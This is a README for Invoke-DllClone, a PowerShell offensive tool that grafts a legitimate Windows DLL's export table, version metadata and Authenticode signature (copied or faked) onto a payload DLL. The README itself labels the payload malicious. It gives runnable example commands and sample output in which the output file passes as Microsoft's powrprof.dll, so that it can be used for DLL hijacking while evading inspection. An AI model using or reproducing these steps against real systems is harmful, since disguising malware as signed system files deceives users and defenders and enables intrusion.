# Invoke-DLLClone
Koppeling x Metatwin x LazySign

 Invoke-DllClone combines two projects called Koppeling and Invoke-MetaTwin. 
 Invoke-DllClone can copy metadata and the AuthenticodeSignature from a source binary and into a target binary
 It also uses koppeling to clone the export table from a refference dll onto a malicious DLL post-build using NetClone
 Finally, it also supports random fake signatures using LazySign logic.
    

All Credits go to: 
* Joe Vest (vestjoe)
* Nick Landers (monoxgas)

And the makers of SigThief

All I did was adapt metatwin to facilitate koppeling :) 

Feel free to place the dependencies in src yourself if you do not trust me.
Dependencies are:
 * NetClone
 * Resource Hacker
 * SigThief (optional)
 * makecert.exe (optional)
 * pvk2pfx.exe (optional)
 * signtool.exe (optional)

**Make Sure you CD into the Invoke-DllClone directory first, the script uses relative paths** 

```
Forward all exports of powrprof and take over the metadata except the signature
Example Usage: Invoke-DllClone -Source C:\Windows\System32\powrprof.dll -Target C:\Malware\Evilpayload.dll -Output C:\Malware\powrprof.dll

Forward all exports of powrprof and take over the metadata including the signature (will obviously no longer be valid)
Example Usage: Invoke-DllClone -Source C:\Windows\System32\powrprof.dll -Target C:\Malware\Evilpayload.dll -Output C:\Malware\powrprof.dll -Sign

Forward all exports of powrprof and take over the metadata fake a random signature (will obviously not be valid)
Example Usage: Invoke-DllClone -Source C:\Windows\System32\powrprof.dll -Target C:\Malware\Evilpayload.dll -Output C:\Malware\powrprof.dll -FakeSign -FakeCompany lolcorp.evil

```


```
Example output:
PS G:\testzone\Invoke-DLLClone> Invoke-DllClone -Source C:\Windows\System32\powrprof.dll -Target .\evilpayload.dll -Output powrprof.dll -Sign
Source:         C:\Windows\System32\powrprof.dll
Target:         .\evilpayload.dll
Output:         .\2021-08-24_204139\powrprof.dll
Signed Output:  .\2021-08-24_204139\signed_powrprof.dll
----------------------------------------------
[*] Clones the export table from C:\Windows\System32\powrprof.dll onto .\evilpayload.dll... using NetClone
[+] Done.
[*] Extracting resources from powrprof.dll
[*] Copying resources from powrprof.dll to .\2021-08-24_204139\powrprof.dll
[*] Extracting and adding signature ...

[+] Results
 -----------------------------------------------
[+] Metadata


VersionInfo : File:             G:\testzone\Invoke-DLLClone\2021-08-24_204139\signed_powrprof.dll
              InternalName:     POWRPROF
              OriginalFilename: POWRPROF.DLL
              FileVersion:      10.0.19041.546 (WinBuild.160101.0800)
              FileDescription:  Power Profile Helper DLL
              Product:          Microsoft® Windows® Operating System
              ProductVersion:   10.0.19041.546
              Debug:            False
              Patched:          False
              PreRelease:       False
              PrivateBuild:     False
              SpecialBuild:     False
              Language:         English (United States)




[+] Digital Signature


SignatureType     : Authenticode
SignerCertificate : [Subject]
                      CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

                    [Issuer]
                      CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

                    [Serial Number]
                      330000026551AE1BBD005CBFBD000000000265

                    [Not Before]
                      3/4/2020 7:30:38 PM

                    [Not After]
                      3/3/2021 7:30:38 PM

                    [Thumbprint]
                      E168609353F30FF2373157B4EB8CD519D07A2BFF

Status            : HashMismatch



PS G:\testzone\Invoke-DLLClone>



```
